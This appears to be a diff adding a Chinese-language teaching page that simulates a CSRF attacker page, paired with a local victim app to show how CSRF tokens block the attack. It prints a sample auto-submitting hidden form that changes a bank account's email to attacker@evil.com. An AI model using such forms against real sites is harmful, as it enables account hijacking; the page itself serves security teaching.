@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>恶意页面（模拟）· CSRF 演示 · 仅供学习</title>
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 640px; margin: 24px auto; padding: 0 16px; line-height:1.6; }
+  .danger { background:#fee2e2; border:1px solid #fca5a5; padding:12px 16px; border-radius:8px; }
+  code { background:#f1f5f9; padding:2px 5px; border-radius:4px; }
+  pre { background:#0f172a; color:#e2e8f0; padding:12px; border-radius:8px; overflow-x:auto; }
+</style>
+</head>
+<body>
+  <h1>🎁 「恭喜您中奖啦！」（其实是恶意页面）</h1>
+  <div class="danger">
+    ⚠️ 仅供学习，勿用于攻击真实站点。本页演示 CSRF 攻击者页面的典型形态：一个用户看不见的自动提交表单。
+  </div>
+
+  <p>页面看起来人畜无害，但背后藏着一个指向目标应用「修改邮箱」接口的隐藏表单，加载即自动提交。</p>
+
+  <p>真实攻击中，攻击者页面会这样写（跨站 POST，浏览器自动带上目标站 Cookie）：</p>
+  <pre>&lt;form action="https://bank.com/change-email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
+
+  <p><strong>演示：</strong>请先在另一个标签打开 <code>victim-app.html</code>（模拟你已登录），本页会尝试把你的邮箱偷偷改成 <code>attacker@evil.com</code>。</p>
+
+  <button onclick="attack()">模拟触发攻击</button>
+  <p id="result"></p>
+
+  <script>
+    // 纯前端演示：真实场景是跨站表单 POST。这里通过打开的 victim 窗口调用其接口，
+    // 以模拟「浏览器自动携带会话、后端据此执行」的效果，并展示 CSRF Token 如何拦截。
+    function attack() {
+      const evilEmail = 'attacker@evil.com';
+      // 攻击者不知道也拿不到目标页面的一次性 token（跨源读被 SOP 拦住），只能瞎猜
+      const guessedToken = 'attacker-does-not-know-the-token';
+
+      // 尝试打开/获取 victim 窗口
+      const victim = window.open('victim-app.html', 'victimApp');
+      setTimeout(() => {
+        try {
+          const res = victim.__changeEmailAPI(evilEmail, guessedToken);
+          const el = document.getElementById('result');
+          if (res.ok) {
+            el.style.color = '#dc2626';
+            el.textContent = '😈 攻击成功：目标邮箱已被改（因为目标未开启 CSRF Token 防御）';
+          } else {
+            el.style.color = '#16a34a';
+            el.textContent = '🛡️ 攻击被拦截：' + res.reason + '（目标开启了 CSRF Token 防御）';
+          }
+        } catch (e) {
+          document.getElementById('result').textContent = '请先打开 victim-app.html 再试';
+        }
+      }, 600);
+    }
+  </script>
+</body>
+</html>
